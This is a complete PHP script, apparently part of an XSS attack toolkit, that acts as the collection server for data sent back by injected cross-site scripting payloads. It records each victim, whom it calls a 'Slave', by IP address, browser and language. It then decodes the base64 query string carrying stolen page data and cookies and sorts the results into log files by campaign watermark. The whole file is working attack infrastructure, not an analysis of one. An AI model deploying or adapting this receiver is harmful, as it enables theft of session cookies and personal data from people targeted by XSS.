<?php
// 记录抓取的信息
// Author: axis

$fvck="Slave login at: ";

$border = "\r\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n";

$slaveip = "Slave IP: ".getenv('REMOTE_ADDR');   //获取IP
$slaveagent = "Slave User-Agent: ".getenv('HTTP_USER_AGENT');  // 浏览器和系统版本
$slavelang = "Slave Lang: ".getenv('HTTP_ACCEPT_LANGUAGE');  // 语言
$requestdate = date("m/d/Y H:i:s", $_SERVER['REQUEST_TIME']); //请求时间
//$requestdate = date(DATE_RFC822);

$qstr = getenv('QUERY_STRING');  // XSS传回的数据

// 使用strpos 而不是 strchr ,因为更快,消耗内存更小
if ( strpos($qstr, "NoCryptMark") === false ){
	$qstr = base64_decode($qstr); // 解码base64
	$qstr = "XSS got: \r\n".urldecode($qstr);
} else {
  //$qstr = urldecode($qstr);
  $qstr = "XSS got: \r\n".urldecode($qstr);
}

/*
//剥离Cookie
$slavecookie = strchr($qstr, "    [**** Cookie");
$slavecookiepos = strpos($qstr, "    [**** Cookie");

// 剥离XSS来源
$slaveuri = substr($qstr, 0, $slavecookiepos);
*/

// 分离出水印
$slaveWatermark = strchr($qstr, "[**** Watermark: ");
$slaveWatermark = strchr($slaveWatermark, "|");

// 如果没有打上水印,则为null,无法找到 "|"
if ($slaveWatermark != false){
  $slaveWatermark = substr($slaveWatermark, 1, 13);  // 分离出watermark(随机的时间值)
  
  // 按水印分目录记录日志
  if(file_exists("slave\\$slaveWatermark") == false){
    // 注意mkdir函数不能递归建立目录
    mkdir("slave\\$slaveWatermark");
  }
  
  // 写日志
  $fp = fopen("slave\\$slaveWatermark\\log.txt","a");
}
else { // 水印为null的
	$fp = fopen("slave\\noWatermarkLog.txt","a");
}

//fwrite($fp,"$border\r\n $fvck $requestdate\r\n $slaveip\r\n $slaveagent\r\n $slavelang\r\n $slaveuri\r\n $slavecookie\r\n$border");
fwrite($fp,"$border\r\n $fvck $requestdate\r\n $slaveip\r\n $slaveagent\r\n $slavelang\r\n $qstr\r\n$border");

fclose($fp);

?>